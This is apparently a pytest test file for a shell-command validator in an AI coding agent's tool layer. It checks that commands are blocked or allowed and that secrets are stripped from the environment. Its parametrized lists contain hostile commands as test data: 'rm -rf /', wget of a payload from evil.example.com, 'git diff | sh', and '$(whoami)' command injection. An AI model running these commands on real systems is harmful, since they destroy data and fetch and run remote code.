from pathlib import Path

import pytest

from app.tools.errors import CommandNotAllowedError, PathSecurityError, ToolError
from app.tools.shell import detect_test_command, run_command, run_tests, sanitized_env, validate_command
from app.tools.workspace import Workspace


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "rm -rf .",
        "del /s /q C:\\",
        "rmdir /s src",
        "curl http://evil.example.com",
        "wget http://evil.example.com/payload.sh",
        "sudo npm test",
        "npm install lodash",
        "npm i left-pad",
        "pip install requests",
        "python -m pip install requests",
        "python -c \"import os; os.remove('x')\"",
        "python script.py",
        "node -e \"require('fs').rmSync('.', {recursive: true})\"",
        "powershell Remove-Item -Recurse .",
        "git push origin main",
        "git reset --hard",
        "git clean -fdx",
        "git diff --output=../stolen.txt",
        "git diff --ext-diff",
        "npm test -- --watch",
        "npm run build",
        "pytest -p malicious_plugin",
        "pytest ../../other-project",
        "",
    ],
)
def test_dangerous_commands_blocked(workspace: Workspace, command: str) -> None:
    with pytest.raises((CommandNotAllowedError, PathSecurityError)):
        validate_command(command, workspace)


@pytest.mark.parametrize(
    "command",
    [
        "npm test && rm -rf /",
        "npm test; curl http://evil.example.com",
        "git diff | sh",
        "git status > out.txt",
        "pytest $(whoami)",
        "pytest `whoami`",
        "npm test\nrm -rf /",
        "npm test & del *",
    ],
)
def test_command_chaining_blocked(workspace: Workspace, command: str) -> None:
    with pytest.raises(CommandNotAllowedError, match="Shell operators"):
        validate_command(command, workspace)


@pytest.mark.parametrize(
    "command",
    [
        "npm test",
        "npm run test",
        "npm run lint",
        "pytest",
        "pytest -q -x",
        "python -m pytest tests/test_cart.py -k empty",
        "python -m pytest tests/test_cart.py::test_empty -v",
        "git diff",
        "git diff --stat src/cart.js",
        "git status --short",
    ],
)
def test_whitelisted_commands_allowed(workspace: Workspace, command: str) -> None:
    assert validate_command(command, workspace)


def test_run_git_status(workspace: Workspace) -> None:
    result = run_command("git status --short", workspace)
    assert result.succeeded
    assert result.duration_ms >= 0


def test_run_blocked_command_never_executes(workspace: Workspace, repo: Path) -> None:
    with pytest.raises(CommandNotAllowedError):
        run_command("rm -rf src", workspace)
    assert (repo / "src" / "cart.js").exists()


def test_sanitized_env_strips_secrets(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-secret")
    monkeypatch.setenv("GITHUB_TOKEN", "ghp_secret")
    monkeypatch.setenv("DB_PASSWORD", "hunter2")
    monkeypatch.setenv("SOME_SETTING", "fine")
    env = sanitized_env()
    assert "ANTHROPIC_API_KEY" not in env
    assert "GITHUB_TOKEN" not in env
    assert "DB_PASSWORD" not in env
    assert env["SOME_SETTING"] == "fine"
    assert "PATH" in env or "Path" in env


def _make_python_project(root: Path, passing: bool) -> Workspace:
    (root / "tests").mkdir(parents=True)
    (root / "pytest.ini").write_text("[pytest]\n")
    (root / "tests" / "test_math.py").write_text(
        f"def test_add():\n    assert 1 + 1 == {2 if passing else 3}\n"
    )
    return Workspace(root)


def test_run_tests_passing(tmp_path: Path) -> None:
    workspace = _make_python_project(tmp_path / "proj", passing=True)
    assert detect_test_command(workspace) == "python -m pytest -q"
    result = run_tests(workspace)
    assert result.succeeded, result.stdout + result.stderr
    assert "1 passed" in result.stdout


def test_run_tests_failing(tmp_path: Path) -> None:
    result = run_tests(_make_python_project(tmp_path / "proj", passing=False))
    assert not result.succeeded
    assert "1 failed" in result.stdout


def test_detect_npm_test(repo: Path) -> None:
    (repo / "package.json").write_text('{"scripts": {"test": "node --test"}}')
    assert detect_test_command(Workspace(repo)) == "npm test"


def test_run_tests_without_test_setup(tmp_path: Path) -> None:
    (tmp_path / "empty").mkdir()
    with pytest.raises(ToolError, match="Could not detect"):
        run_tests(Workspace(tmp_path / "empty"))
